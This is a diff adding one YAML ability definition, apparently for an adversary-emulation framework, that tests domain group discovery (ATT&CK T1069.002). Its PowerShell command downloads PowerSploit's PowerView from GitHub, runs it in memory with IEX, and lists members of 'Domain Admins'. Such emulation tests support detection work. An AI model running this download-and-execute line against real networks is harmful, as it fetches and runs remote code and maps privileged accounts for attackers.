@@ -1,0 +1,13 @@
+- id: 67de5abc-34d3-5024-9acd-cb84fe579976
+  name: Soumaia ART Tests - Get-DomainGroupMember with PowerView
+  description: Utilizing PowerView, run Get-DomainGroupMember to identify domain users. Upon execution, progress and info about groups within the domain being scanned will be displayed.
+  tactic: discovery
+  technique:
+    attack_id: T1069.002
+    name: 'Permission Groups Discovery: Domain Groups'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember "Domain Admins"
